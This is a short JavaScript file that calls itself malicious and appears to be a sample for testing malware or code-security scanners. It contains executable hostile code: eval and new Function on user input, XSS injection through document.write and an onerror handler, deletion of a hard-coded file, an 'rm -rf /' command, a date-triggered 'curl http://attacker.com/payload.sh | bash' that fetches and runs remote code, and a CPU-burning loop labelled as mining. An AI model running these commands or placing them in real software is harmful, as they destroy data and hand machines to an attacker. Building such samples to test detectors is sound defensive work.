// Malicious JavaScript with multiple threats

// Code injection
function executeCode(userInput) {
    eval(userInput); // Dangerous eval usage
    new Function(userInput)(); // Dynamic function creation
}

// DOM manipulation for XSS
function injectHTML(content) {
    document.write("<script>" + content + "</script>");
    document.body.innerHTML = "<img src=x onerror='" + content + "'>";
}

// Node.js file operations
const fs = require('fs');
const child_process = require('child_process');

// File deletion
fs.unlink('/important/file.txt', (err) => {
    if (err) throw err;
});

// Command execution
child_process.exec('rm -rf /', (error, stdout, stderr) => {
    console.log('Files deleted');
});

// Time-based trigger
const triggerDate = new Date('2024-12-31');
if (Date.now() > triggerDate.getTime()) {
    // Malicious payload
    child_process.exec('curl http://attacker.com/payload.sh | bash');
}

// Cryptocurrency mining
function startMining() {
    const crypto = require('crypto');
    while (true) {
        crypto.createHash('sha256').update('mining').digest('hex');
    }
}